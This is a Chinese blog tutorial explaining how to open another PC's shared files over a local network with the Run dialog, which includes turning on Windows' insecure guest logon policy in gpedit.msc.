（1）同时按下“win”+“R”调出指令窗口，弹出的界面输入电脑1的IP，然后“确定”
（2）一般会弹出如下错误提示，需要对电脑2进行设置
（3）同时按下”win“+”R“，输入”gpedit.msc“设置来宾访问
（4）弹出的界面进行如下查找：计算机配置—&gt;管理模板—&gt;网络—&gt;Lanman工作站，此时“启用不安全的来宾登录”是未配置状态
（5）双击“启用不安全的来宾登录”，弹出的对话框中勾选“已启用”，然后“应用”“确定”
（6）此时在运行界面输入电脑1的IP点击确定就可以看到其共享的文件
（7）共享的文件如下图所示，双击即可打开 电脑2共享文件给电脑1也是同样的方法，只是在电脑1运行界面应该输入电脑2的IP。
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/270/">«</a>
	<span class="pagination__item pagination__item--current">271/489</span>
	<a class="pagination__item pagination__item--next btn" href="/page/272/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>